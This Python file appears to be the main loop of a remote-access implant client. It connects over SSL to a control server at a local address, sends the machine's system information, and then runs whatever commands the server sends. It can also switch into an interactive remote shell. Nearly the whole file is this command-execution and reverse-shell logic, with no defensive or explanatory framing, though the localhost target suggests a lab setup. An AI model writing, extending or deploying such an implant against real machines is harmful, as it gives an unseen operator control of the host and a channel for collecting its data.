from client.client import SSLClient
from client.system_info import get_system_info
import json


def main():

    client = SSLClient(
        server_host="127.0.0.1",
        server_port=8888,
        sni_hostname="localhost",
        client_cert="../../certs/cert.pem",
        client_key="../../certs/key.pem",
    )

    client.connect()
    info = get_system_info()
    client.send(json.dumps(info))

    print("Connected to server")

    while True:

        if client.interactive_shell:
            data = client._ssock.recv(1024)

            if not data:
                print("Server disconnected")
                break

            cmd = data.decode()

            if cmd.strip().lower() in ["exit", "quit"]:
                client.interactive_shell = False
                client.send("[+] Exiting shell")
                continue

            result = client.execute_command(f"shell {cmd}")
            client.send(result if result else "")

        else:
            command = client.receive()

            if command is None:
                print("Server disconnected")
                break

            print(f"Received command: {command}")

            if command.strip() == "shell":
                client.interactive_shell = True
                client.send("[+] Interactive shell started")
                continue

            result = client.execute_command(command)
            client.send(result if result else "\n")

    client.close()


if __name__ == "__main__":
    main()
